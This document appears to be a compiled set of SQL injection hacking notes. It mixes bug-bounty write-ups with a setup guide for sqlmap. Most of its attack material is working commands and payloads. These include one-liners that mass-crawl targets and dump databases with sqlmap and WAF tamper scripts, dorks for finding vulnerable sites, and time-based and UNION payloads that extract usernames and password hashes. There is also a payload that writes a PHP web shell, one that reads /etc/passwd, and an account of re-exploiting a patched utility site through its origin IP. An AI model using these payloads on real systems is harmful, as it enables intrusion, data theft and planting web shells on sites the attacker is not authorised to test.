
```bash
echo "target.com" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.target.com.txt;sqlmap -m sqli.target.com.txt --risk=3 --level=5 --random-agent --technique=T --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbs --dump

#use this  oneliner to find only time based sqli. You need to install urlfinder,gau,sqlmap tools on your system.
```

_Xray crawls websites and flags potential SQLi vectors without sending malicious payloads.

```css
xray webscan --url-file final_subdomains.txt --plugins sqldet
```

**What it finds:**

_Error-based, Boolean-based, and Time-based SQLi.

SQLmap is powerful but slow if used manually. **Automate it:**

```bash
for url in $(cat urls_with_params.txt); do sqlmap -u $url --batch --crawl=1 --level=3; done

# You may want to add ghauri with it.
```

**Key flags:**

- `--batch` (non-interactive)
- `--crawl=1` (auto-discovers new links)

_**Real-world success:** A hacker found 6 SQLi bugs in a single day using this method.?_

**You can find SQli in URL Parameters too:**

```
/products?search=shoes
```

A tiny change in the URL made all the difference:

```sql
/products?search=' OR 1=1--

#payload

' UNION SELECT username, password FROM users--
```

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
## How to Run SQLMAP from Anywhere in Windows CMD (Complete Setup Guide)

Head to the official [**GitHub repo**](https://github.com/sqlmapproject/sqlmap)**:**

Click on Code → Download ZIP,

OR

Use Git if you have it installed:

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

`--depth 1` is optional; it clones only the latest commit to save time and space.

## 🗃️ Step 2: Move SQLMAP to a Permanent Location

To keep things organized, move the extracted folder to a permanent place like:

**_C:\Tools\sqlmap_**

(You can also create the Tools folder if it doesn’t exist, i have made this for reference and make it easy for you to setup)

## ⚙️ Step 3: Add sqlmap to Your Windows PATH

This is the key step that lets you run Sqlmap from anywhere.

1. Press **_Win + S_** and search for Environment Variables

2. Click on Edit the system environment variables

3. Under the Advanced tab, click on Environment Variables

4. Under System variables, find the variable named Path, and click Edit

5. Click New and add this path: **_C:\Tools\sqlmap_**

Click OK to save everything.

## 🐍 Step 4: Create a Batch File to Make It Click

Now, create a small wrapper file so you can just type Sqlmap and it knows to run sqlmap.py.

Here’s how:

1. Go to the **_C:\Tools\sqlmap_** folder

2. Create a new file called sqlmap.bat

3. Paste this into it:

```bash
@echo off  
python C:\Tools\sqlmap\sqlmap.py %*
```

_This batch file will pass any arguments directly to sqlmap.py using Python.

## ✅ Step 5: Test It Out

Close any open CMD windows (to reload the environment), then open a new one and type:

```
sqlmap -h
```

You should see the beautiful sqlmap help menu. If not:

• Check if Python is installed

• Make sure Python is added to the system PATH

• Recheck the _.bat_ file location and content

## 📦 Final Directory Structure

Here’s what your **_C:\Tools\sqlmap_** should contain:

_C:\Tools\sqlmap_

├── _sqlmap.py_

├── _sqlmap.bat_

├── other sqlmap folders and files…

<<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>>
### How to Search for SQL Injection Vulnerabilities (High-Scope Method)

1. **Using Google Dork:**  
— Execute the following query on Google:  
```bash
site:.il “You have an error in your SQL syntax”  
```  
— This search will help you find endpoints that clearly display SQL errors on their pages, suggesting they might be vulnerable to SQL Injection (SQLi) with a high probability.

2. **Record Vulnerable Endpoints:**  
— Save these endpoints where SQL errors are displayed in your notes. This indicates potential SQLi vulnerabilities.

3. **Utilize the Wayback Machine:**  
— Visit the Wayback Machine to find historical versions of the website. Use the following command:  
```  bash
waybackmachine [https://test.il](https://test.il) | grep “=”  
```  
— This will help you identify endpoints with parameters. Filter and remove duplicates, then save these in your notes as well.

4. **Manual Inspection:**  
— Access the website and monitor the Network tab in Inspect Element.  
— For example, on a login page, submit a request with any username and password. Capture this POST request and save it in your notes.  
— **Repeat this process for all GET and POST requests, and look for hidden parameters in the source code or by guessing.**

5. **Collect and Analyze Requests:**  
— Save all captured requests.  
— After collecting them, sort and remove duplicates.

6. **Testing for SQL Injection:**  
— **Direct Error-Based SQLi:**  
— Test parameters by injecting SQL payloads such as `’, “`, ` — `, `;`, and `/*`.  
— Example payload for testing:  
``` bash
1' UNION SELECT 1, table_name FROM information_schema.tables —  
```  
— If you receive any information, use SQLMap to extract more data.  
— **Blind SQL Injection Based on Boolean:**  
— Test the condition by altering parameter values:  
```  bash
AND 1=1 —  
```  
```  
AND 1=2 —  
```  
— If the response changes, the site may be vulnerable.  
— **Blind SQL Injection Based on Time:**  
— Test with time-based payloads:

```  bash
OR IF(1=1, SLEEP(5), 0) —  
```  
— If the site response is delayed by 5 seconds, it is likely vulnerable.

7. **Using SQLMap for Database Extraction:**  
— For GET requests:  
```  bash
sqlmap -u [https://test.il](https://test.il) — dbs — threads=10  
```  
— For POST requests:  
```  bash
sqlmap -u [https://test.il](https://test.il) — data=”parametername=value” — dbs  
```

(ask copilot what "parametername means by the POST request)

— For authenticated requests:  
``` bash 
sqlmap -u “[https://test.il](https://test.il)" — data=”parametername=value” — cookie=”value” — dbs  
```  
— For multipart requests (copy the full request into a file named `request.txt`):  
``` shell 
sqlmap -r request.txt — dbs — threads=10  
```

- Utilize various SQLMap options to bypass WAFs (Web Application Firewalls) and retry with stronger payloads and encoding.

— 

![](https://miro.medium.com/v2/resize:fit:875/0*Zca2zPL9CuUaqaVf)

---

### LostFuzzer: Passive URL Fuzzing & Nuclei DAST scanner

github tool: https://github.com/coffinxp/lostfuzzer

use this wordlists to detect **VULNERABLE** sqli parameters:

>https://github.com/ShivamRai2003/SQL-Injection-Google-Dork-List/blob/main/SQL-Injection-Dork%20List

### Manual exploit example:

and create a wordlist which contains website wich contain vulnerable sqli parameters (after crawling them with gau and other tools:)

![[Pasted image 20250309005747.png]]

-> put all of them in "sqli.txt"

![[Pasted image 20250309004332.png]]

## Now we will try to find them with nuclei:


![[Pasted image 20250309004554.png]]

## How to exploit them:

![[Pasted image 20250309010041.png]]

## Now what if we can do all of this automatically? this is where it comes LostFuzzer:

![[Pasted image 20250309011214.png]]

![[Pasted image 20250309011403.png]]

						output vulnerable urls

You can then test them with ghauri:

![[Pasted image 20250309011723.png]]


**Bonus (in case WAF is blocking your ip):**
![[Pasted image 20250309012309.png]]

			ModSecurity WAF are so easy to Bypass !

i used proxychains bcz site blocking my ip in just few attempt..

```bash
proxychains sqlmap -u 'url' --random-agent --batch --dbs --level 3 --tamper=between,space2comment --hex --delay 5
```

---


---
## Quick SQLi To RCE Method:

The following is an example of an SQL injection payload that can be used to upload a PHP shell to the server:

```sql
' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php' #
```

This payload injects a new SELECT statement into the original SQL query and writes the PHP code to a file called “shell.php” in the “/var/www/html/” directory on the server. The attacker can then access the PHP shell by navigating to “[http://target-server/shell.php?cmd=[command]](http://target-server/shell.php?cmd=%5Bcommand%5D)" in a web browser.

Example 2: Reading the **“etc/passwd” file:**

The following is an example of an SQL injection payload that can be used to read the “/etc/passwd” file on the server:

```sql
' UNION SELECT load_file('/etc/passwd') #
```

This payload injects a new SELECT statement into the original SQL query and loads the contents of the `“/etc/passwd"` file into the result set.


---

# Time Based SQL Injection Bug Hunting Methodology💉

## We need to find out the database used by the web app.

![](https://miro.medium.com/v2/resize:fit:402/1*wEfUahta9DkFVa06W5yxCQ.png)

Burpsuite Repeater Tab: Response time from the server

![](https://miro.medium.com/v2/resize:fit:700/1*Q-mwjJBDlH_6oSz2bHM84w.png)

![](https://miro.medium.com/v2/resize:fit:237/1*vZjt0GhQ2z0-JncSX_oISA.png)

You are lucky if you find it is running on PHP + MySQL 🤑. Must try SQLi

Alternatively,

```js
subfinder -d domain.com -all -recursive > subs_domain.com.txt  
cat subs_domain.com.txt | httpx -td -title -sc -ip > httpx_domain.com.txt  
cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt

cat live_subs_domain.com.txt | grep -i php  
cat live_subs_domain.com.txt | grep -i asp  
  
  
cat live_subs_domain.com.txt | grep -i apache  
```

![](https://miro.medium.com/v2/resize:fit:700/1*nyaTWaxdUwhbXpUIKEXMYw.png)

Or directly hit the endpoint:

```js
site:domain.com ext:.php  
site:domain.com ext:.asp  
site:domain.com ext:.aspx  
site:domain.com ext:.do  
site:domain.com ext:.cgi  
site:domain.com ext:.action  
site:domain.com ext:.jsp
```

Now we need to find subdomains / endpoints where it is running on old technology like PHP , ASP, ASPX, which increases the probability that it is associated with traditional DBMS.

Below are the list of payloads specifically for time based sqli testing which are valid and reported on HackerOne using this:

```sql
0'XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR'Z  
  
0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z  
  
if(now()=sysdate(),sleep(20),0)/*'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0))OR"*/  
  
1234 AND SLEEP(20)  
  
';WAITFOR DELAY '00:00:05';--
```

```sql
(select(0)from(select(sleep(6)))v)/*'+  
(select(0)from(select(sleep(6)))v)+'"+  
(select(0)from(select(sleep(6)))v)+"*/

```

If the parameter value is a number

```sql
paramname=1'-IF(1=1,SLEEP(20),0) AND paramname='1
```

# INJECTION POINTS 😈

Now where do we inject guys?

💉 = insert the payload here:

# INJECTION POINTS 😈

Now where do we inject guys?

💉 = insert the payload here

## URI Paths

_example request:_

```cs
GET /path1/path2/path3/path4 HTTP/2  
POST /path1/path2/path3/path4 HTTP/2
```

_exploitation positions:_

```cs
GET /path1💉/path2💉/path3💉/path4💉 HTTP/2  
  
GET /💉path1/💉path2/💉path3/💉path4 HTTP/2  
  
POST /path1💉/path2💉/path3💉/path4💉 HTTP/2  
  
POST /💉path1/💉path2/💉path3/💉path4 HTTP/2
```

## User-Agent Header

_example request:_

```ruby
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
```

_exploitation positions:_

```ruby
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0💉  
  
User-Agent: 💉  
  
User-Agent: 💉Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
```

## Referer Header

_example request:_

```sql
Referer: https://www.google.com/
```

_exploitation positions:_

```sql
Referer: https://www.google.com/💉  
Referer: 💉https://www.google.com/  
Referer: 💉
```

## Cookie parameter names + values

_example request:_

```ruby
Cookie: param1name=param1value; param2name=param2value
```

_exploitation positions:_

```ruby
Cookie: param1name=param1value💉; param2name=param2value💉  
  
Cookie: param1name=💉param1value; param2name=💉param2value  
  
Cookie: param1name💉=param1value; param2name💉=param2value  
  
Cookie: 💉param1name=param1value; 💉param2name=param2value

```
## GET based parameter names + values

```ruby
GET /path1/path2/anyname.php?param1name=param1value&param2name=param2value
```

```ruby
GET /path1/path2/anyname.php?param1name=param1value&param2name=param2value💉  
GET /path1/path2/anyname.php?param1name=param1value&param2name=💉param2value  
GET /path1/path2/anyname.php?param1name=param1value&param2name💉=param2value  
GET /path1/path2/anyname.php?param1name=param1value&💉param2name=param2value  
GET /path1/path2/anyname.php?param1name=param1value💉&param2name=param2value  
GET /path1/path2/anyname.php?param1name=💉param1value&param2name=param2value  
GET /path1/path2/anyname.php?param1name💉=param1value&param2name=param2value  
GET /path1/path2/anyname.php?💉param1name=param1value&param2name=param2value
```

## POST based parameter names + values

```ruby
POST /login HTTP/2  
Host: redacted.com  
Cookie: .............  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: application/x-www-form-urlencoded  
Content-Length: ...  
Dnt: 1  
Sec-Gpc: 1  
Referer: https://www.google.com  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Te: trailers  
  
email=admin@admin.com&password=pass1234
```

									request example.


```ruby
email=admin@admin.com&password=pass1234💉  
email=admin@admin.com&password=💉pass1234  
email=admin@admin.com&password💉=pass1234  
email=admin@admin.com&💉password=pass1234  
email=admin@admin.com💉&password=pass1234  
email=💉admin@admin.com&password=pass1234  
email💉=admin@admin.com&password=pass1234  
💉email=admin@admin.com&password=pass1234

```

Black box testing, you never know how the server might behave.😜

**If you get the expected delay response time to be 20 seconds or more than 20 seconds, increase and decrease the number and verify with 5–6 test cases**

You can report at this point of time to the company or the crowd-sourced platform program target, run sqlmap or ghauri automated tool only when it is asked by the triager.

# Daily Bug Report Reading Habit

You can refer valid publicly disclosed bug reports by using below dork

```ruby
site:hackerone.com inurl:reports "time based"  
site:hackerone.com inurl:reports "time based SQL Injection"  
site:hackerone.com inurl:reports "SQL Injection"  
site:hackerone.com inurl:reports "XOR"

```
![](https://miro.medium.com/v2/resize:fit:700/1*txGkNiQSsiyv3uIEDQUwwg.png)

I suggest to solve [portswigger sql injection labs](https://portswigger.net/web-security/all-labs) to gain more insights into it before diving straight into real world targets.

> For comprehensive payloads based on the DBMS used, refer below👇

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

🤔_Note: In modern apps , you will often find NOSQL databases like mongodb, and the traditional SQL Injection methods don’t work and approach is different in this case.Need to learn NO-SQL Injection for this._

## What about automated open source tools for time based SQLi?

Apart from sqlmap & ghauri, the rest of the open source tools that I have tried all results into false positive as well default nuclei templates, due to the reason that ~={orange}the response from the server might be delayed based on VPN issues, bandwidth issues, internet connection, server processing for invalid strings, etc…=~

---

> [From Long-Term Hacking to Instant Rewards: Finding SQLi in 3 Minutes Worth $3125 | by Gökhan Güzelkokar | Medium](https://medium.com/@gguzelkokar.mdbf15/from-long-term-hacking-to-instant-rewards-finding-sqli-in-3-minutes-worth-3125-ac36c6e950bf)

"From Long-Term Hacking to Instant Rewards: Finding SQLi in 3 Minutes Worth $3125"

In this story, I’ll show you how I easily found an SQL injection in my program. Please don’t focus on the SQL injection, bounty, or anything specific; instead, focus on the logic of working with a company for many years. Before I start, I’ll provide some examples of other bug bounty hunters’ profiles.

![](https://miro.medium.com/v2/resize:fit:656/1*TiV-JmxxeX-2H9h93gAcvA.png)
Reports
d0xing had 131k points, and he has 13k points from one program, which is ~10%.

![](https://miro.medium.com/v2/resize:fit:656/1*qpUewV0VCQvO5aOgq2v9HQ.png)

try_to_hack had 102k point and he has 78k points from one program, which is ~%75!

![](https://miro.medium.com/v2/resize:fit:656/1*wWhjzr4_ZHUvO159KofzAw.png)

	zseano had 26k point and he has 16.5k points from one program, which is ~%63!

So I have a couple of programs too. One of my favorites is a program I’ve been hacking for over 2 years. I can quickly notice when a developer changes a button in the main application. I’ve tested over 300 endpoints and 40 domains. If I see a new one, I can notice it too. I also follow API documentation releases, the program’s social media channels, and newsletters.

## How I Found SQLi in 3 Minutes in this Private Program

I woke up at 03:00 a.m., and I need to edit my presentation for an upcoming session. Then I visited my bug bounty program and noticed there was a new feature added. I saw that from my staging envorinment.

When I used the new feature, I discovered a PUT request, and all I did was add a single quote to the ‘id’ parameter, which resulted in an error-based SQL injection. After some trials, I executed ‘(select sleep(4))’ and the database slept for 12 seconds because it executed 3 times.

![](https://miro.medium.com/v2/resize:fit:656/1*5aArKuhfBMdJOY196RX6Kw.png)

![](https://miro.medium.com/v2/resize:fit:534/1*n_RIO75CSbUL2eH5dSOxOg.png)

_I was rewarded $3125 for it._

---

## SQLi Methodology by coffin:

![[Pasted image 20250125233015.png]]

![[Pasted image 20250125233135.png]]

![[Pasted image 20250125233310.png]]

![[Pasted image 20250125233730.png]]

output:

![[Pasted image 20250125234057.png]]

			test it on the url.

----


sqli by lostsec:

template: https://github.com/coffinxp/nuclei-templates
## SQL injection

SQL Injection is a type of attack where an attacker inserts malicious SQL code into a query allowing them to manipulate or access a database in unauthorized ways. this template will help to detect error based sql injection

> cat domains.txt | nuclei -t errorsqli.yaml -dast

![](https://miro.medium.com/v2/resize:fit:700/1*OmTXtz2uHqrAX3IRUxuPxw.jpeg)

![](https://miro.medium.com/v2/resize:fit:700/1*qeRaC97hWghINaGW0do0VQ.jpeg)

lostsec:
https://youtu.be/KgLKI2oPDtw


---

# The Recon Phase

I started manual recon using tools like **waybackurls**, **katana**, and **gauplus**.

Result? Tons of juicy URLs — but most of them gave me the classic **403 Forbidden**.

I bypassed the **403** using **403 bypasser tools**.

Since it was a Java app running on Apache Tomcat, the backslash had to be encoded as: `**%5c**`.

Even the **500 Internal Server Error** could be bypassed using a **double backslash ()**.

# 🥸 The Hidden Gems

**Pro tip:** Don’t forget to dig through JS files — sometimes, they hide treasure.

I got lucky and found some juicy parameters:

- **SelectedSources**
- **SelectedNames**
- **SelectedTemplate**

My bug hunter instincts kicked in. Time to test for SQLi!

# ⚡ The SQLi Attack

I ran **SQLmap** like a warrior:

```bash
sqlmap -u "https://example.com/news.php?selectedSources=xxxxx" \  
  --dbms=postgres \  
  --cookie="PHPSESSIONID=xxxxx” \  
  --random-agent --level=5 --risk=3 --dbs --batch
```

🔍 **SQLmap Results:**

- **Parameter:** selectedSources (GET)
- **Type:** Boolean-based blind

**Payload:**

```bash
selectedSources=someSources') OR 06690=6690 OR ('04586'='4586

```
- **Type:** Time-based blind

**Payload:**

```bash
selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586
```

# 🏆 The Victory

```
[09:22:33] [INFO] Testing PostgreSQL  
[09:22:34] [INFO] Confirming PostgreSQL  
[09:22:34] [INFO] The back-end DBMS is PostgreSQL  
[09:22:34] [INFO] Fetching database names  
[09:22:51] [INFO] Retrieved: 3  
[09:26:01] [INFO] Retrieved: information_schema  
[09:27:51] [INFO] Retrieved: pg_catalog  
[09:28:57] [INFO] Retrieved: public
```


---

## Bypass WAF  With:


- Using encoded characters: `%27` for `'`, `%3C` for `<`
- Replacing keywords: `UNION` → `UnIOn`, `SELECT` → `sElEcT`
- Bypassing scripts via SVG tags, malformed HTML


Here’s what started working:

```js
/api/v1/search?query=%27UNION%0ASELECT%201,2,3--
```

Even better:

```js
/api/v1/search?query=%df%27%20OR%201=1--
```

I went deeper. Payloads that triggered internal server errors gave clues about backend DB structure. Then I tried this:

```js
/api/v1/search?query=%27%20/**/UNION/**/SELECT/**/1,2,3--+
```

And BAM! A different error.

**Finally, I used:**

```js
/api/v1/search?query=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,@@version,user()--+
```

Result: Database version and user were dumped in the response.

###  Data Exposure Time

I explored further using WAF-friendly payloads:

```js
/api/v1/user?id=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,username,password,email/**/FROM/**/users--+
```

Results:

- Usernames
- Password hashes (weakly hashed too)
- Emails, tokens

# 💣 Real Proof of Concept

Request:

```js
GET /api/v1/search?query=1%27/*!50000UNION*/SELECT*/1,@@version,user()--+  
Host: api.bountyheaven.com

```

Response:

```http
{  
  "result": [  
    "5.7.34-log",  
    "dbadmin@localhost"  
  ]  
}
```


---

## SQL injection in largest Electricity Board of Sri Lanka

_In this article I'll describe how I found SQL injection vulnerabilities by bypassing WAFs with origin IP, IDOR, and information disclosure bugs._


### How i find this vulnerability

I visited the website and used the Wappalyzer extension to check the site's technology stack. The extension revealed that the site was built with PHP which as many of you know is often vulnerable to SQL injection vulnerabilities. Additionally, as seen in the screenshot, it indicated that Cloudflare WAF was protecting the website.

![None](https://miro.medium.com/v2/resize:fit:700/1*6pgCQz0sFgJIPqSRT36a_A.jpeg)

My approach began with this best one-liner command:

```perl
subfinder -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

This command finds all subdomains of ceb.ik, verifies which ones are live and collects information about their status, title, and technologies, then filters the results to show only subdomains running PHP, ASP, JSP, or similar server-side technologies that are frequently susceptible to SQL injection.


![None](https://miro.medium.com/v2/resize:fit:700/1*1BgMLrhoUXsTPlJcArc_Ig.jpeg)

As you can see in the screenshot, I discovered several subdomains running on PHP technology and protected by Cloudflare WAF. but one subdomain payment.ceb.ik which wasn't protected by Cloudflare WAF caught my attention This made it a prime target for further investigation.

After visiting the subdomain, I found an option to make payments. When I clicked on it, it prompted me to enter an account number. I tried a few random values but none of them were valid

![None](https://miro.medium.com/v2/resize:fit:700/1*1SDUTZiTBWPYvn6WmbNYZg.jpeg)

Next, I used the GAU tool to check all passive URLs associated with the subdomain, hoping to find something interesting. During this process, I discovered a leaked account number in one of the URLs.

```
echo https://payment.<REDACTED> | gau
```

![None](https://miro.medium.com/v2/resize:fit:700/1*o5rgmMl4z91LUyqKX4nQGw.jpeg)

After this, I entered the leaked account number into the input field. Surprisingly, it disclosed someone else's payment information, including their sensitive details, and allowed me to proceed with making a payment on their behalf. Even more concerning, I realized this could be done for any other user of the website by simply using their account numbers.

![None](https://miro.medium.com/v2/resize:fit:700/1*Ol1JgTCsravTcWAN-8BaCw.jpeg)

After examining the URL endpoint, I decided to test for SQL injection by entering a single quote ('). This triggered an "Ongoing Maintenance" error, which caught my attention and motivated me to investigate the endpoint further.

![None](https://miro.medium.com/v2/resize:fit:700/1*9NxM5ck0frX-Ytl2dHNoAQ.jpeg)

After this, I quickly opened Burp Suite, intercepted the endpoint request and sent it to the Intruder for further testing. I used my XOR payload list which contains numerous XOR-based blind SQL injection payloads bypass targeting the account number in the URL path. Once I started the attack and filtered the responses, I noticed several delayed response codes indicating the presence of a time-based SQL injection vulnerability

![None](https://miro.medium.com/v2/resize:fit:700/1*zIXKoqIVybWSwd2kzKeK1w.jpeg)

To verify, I forwarded one of the payload requests to the Repeater and sent the GET request. The reply indicated a 10-second delay with a 500 status code, confirming that the endpoint was susceptible to time-based SQL injection.

![None](https://miro.medium.com/v2/resize:fit:700/1*YGXo7VP_n_aM7Qyc955XHQ.jpeg)

To confirm further, I used the CURL tool to test the delayed responses. The consistent delays in the responses confirmed me without a doubt that the endpoint was 100% vulnerable to time-based SQL injection.

![None](https://miro.medium.com/v2/resize:fit:700/1*i74rsHdhTRoXGeltGCUZtQ.jpeg)

Now for the final step I used the Ghauri tool to exploit this SQL injection vulnerability. I chose Ghauri because it's one of the best tools for detecting and exploiting XOR-based SQL injections, offering more reliable results compared to SQLmap which lacks in XOR-based SQL testing

```
ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --tech=T
```

![None](https://miro.medium.com/v2/resize:fit:700/1*JmnQTqx40InoIR646FRVOw.jpeg)

As shown in the screenshot, I successfully retrieved the database. I used the — tech=T flag in Ghauri because I knew it was a time-based SQL injection and i used (*) custom marker so ghauri will test only on that endpoint. This flag ensured more accurate and reliable results during the exploitation process

### **Report Submission**

After discovering the vulnerability, I quickly reported it to their technical team, pushing them to fix it immediately to prevent any potential exploitation. Unfortunately their response was extremely slow taking several weeks to acknowledge my report.

> In the meantime I decided to continue testing the site for other vulnerabilities, and my investigation began once again..

### Directory Fuzzing

This is an effective method to discover hidden directories and files on a website, which can help identify potential vulnerabilities. I used Dirsearch for this but you can also use FFUF as an alternative

```
dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url
```

![None](https://miro.medium.com/v2/resize:fit:700/1*nxkEKIxCjbOCnS_7-4I1Aw.jpeg)

In the screenshot, you can observe that I found several sensitive directories and files. Among these, the .env and .git files are the most crucial, as they may present significant security risks:

![None](https://miro.medium.com/v2/resize:fit:700/1*HP_DWV8ycRlyPEnTQxA6qA.jpeg)

After accessing the .env files, I was able to retrieve the website's database credentials and secret keys. These are highly sensitive details and are typically classified as a P1 (critical) vulnerability in bug bounty programs

Following this I utilized the Git Dumper tool to retrieve all deleted commits and uncover additional details from the Git repository disclosure

![None](https://miro.medium.com/v2/resize:fit:700/1*gJr3sUAURbotOpp7kav8Vw.jpeg)

In the meantime the company addressed the issue and patched the bug after I shared and tagged it on Twitter. However I decided to give it another shot by attempting to discover the origin IP and exploit it again. And so my hunting resumed.

### WAF Bypass by Origin ip

Web Application Firewalls are designed to protect websites from malicious traffic, but they can sometimes be bypassed by spoofing or manipulating the origin IP address. By mimicking trusted IP addresses or exploiting misconfigurations, attackers can evade WAF detection and gain unauthorized access.

I used a simple one-liner with the Shodan CLI command to quickly uncover the website's origin IP address along with its title and server information:

```
shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
```

![None](https://miro.medium.com/v2/resize:fit:700/1*C0UuUvdV9tsR73YvxQLNng.jpeg)

As shown in the screenshot I discovered the origin IP addresses for two domains one belonging to the payment system where I had previously found an SQL vulnerability, and the other for the main website. When I accessed these IP addresses directly in the browser they were fully accessible and not protected by a WAF. 

I exploited the SQL on the same endpoint again and **I was able to retrieve the same database even though the team had patched it.** By targeting the origin IP I bypassed the patch and successfully executed the exploit.


I additionally checked the source IP of the main website with Burp Suite. After crawling the site I discovered a POST endpoint which provided additional parameter for further testing.


```rust
POST /contactus/load_area_office HTTP/1.1
Host: 124.43.162.71
Cookie: <REDACTED>
Content-Length: 16
Sec-Ch-Ua-Platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Origin: https://124.43.162.71
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://124.43.162.71/contactus/en
Accept-Encoding: gzip, deflate, br
Accept-Language: it,it-IT;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: keep-alive

iMainOfficeID=11
```

In the body of this POST request I observed the parameter iMainOfficeID=11. I inserted a single quote (') into this parameter which immediately triggered an SQL error. I quickly ~={green}copied the raw request from Burp Suite and saved it as request.txt on my Kali machine for further testing.=~

> ghauri -r request.txt --dbs --batch --level 3 --tech=t 

And after some time — boom! I successfully exploited an SQL injection again, this time on the main website through its origin IP completely bypassing the Cloudflare WAF protection.

![None](https://miro.medium.com/v2/resize:fit:700/1*VIGTa4KuoTonsBCoqlDfKQ.jpeg)

This demonstrates that despite developers thinking their site is secure by implementing a WAF, attackers can still exploit the origin IP to bypass protections and hack the website with ease.

---

### **How Was the Vulnerability Found?**

The researcher investigated an endpoint on the inDrive promo site: `https://promo.indrive.com/10ridestogetprize_ru/random`.

When the "**Сгенерировать**" button was clicked, it sent a request to the following API:

```bash
https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone
```

By altering the request URL, the researcher demonstrated how the server could be manipulated:

1. **Original Path**:

```bash
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone
```

**2. Modified Path (Injected SQL)**:

```bash
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
```

This query returned random data from the database, indicating that the SQL injection was successful.

2. **Testing the Response**: When the researcher replaced `1=1` with `1=2` in the path:

```bash
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
```

The response was empty, confirming that the SQL condition was being processed by the server.

Using these techniques, the researcher was able to extract sensitive information, such as the SQL version used by the database:

**PostgreSQL 14.8 (Ubuntu 14.8–0ubuntu0.22.04.1)**


### **Vulnerability Details**

> For Report: [click here](https://hackerone.com/reports/2051931)

- **Researcher:** [Kristoferent](https://hackerone.com/reports/2051931)
- **Vulnerability Type:** Blind SQL Injection
- **Severity:** critical
- **Affected Functionality:** API Endpoint for retrieving user data


---

Here I found some sensitive file using robots.txt

![None](https://miro.medium.com/v2/resize:fit:700/0*0dmyWrQzf8CTgCmn.png)

			i got an admin page here

![None](https://miro.medium.com/v2/resize:fit:700/0*FrasUDfSry2K6kIl.png)

						Not accessible

![None](https://miro.medium.com/v2/resize:fit:700/0*Aa25pdNVJAhJThEx.png)

						Use Google Dorks

![None](https://miro.medium.com/v2/resize:fit:700/0*t9J8RqhlzWrs8ehs.png)


							Log in page access

					Now lets try to bypass it..

### 1. Default Credentials

In this situation, first thing I do is check for default credentials like:

```hell
admin:admin

admin:password

user:user
```

![None](https://miro.medium.com/v2/resize:fit:700/0*1YCFCaqEz8v4EQ2V.png)

				Using default username and passwords

![None](https://miro.medium.com/v2/resize:fit:700/0*NfgRxEOi1gi1p21F.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*WR3Q9XllsJNUz9CI.png)

### Generic Error Based Payloads

![None](https://miro.medium.com/v2/resize:fit:700/0*ZIx5Gx5eLR13SqRS.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*f0hFqdwCv06REvJy.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*VPNibP0mndpPwsIQ.png)

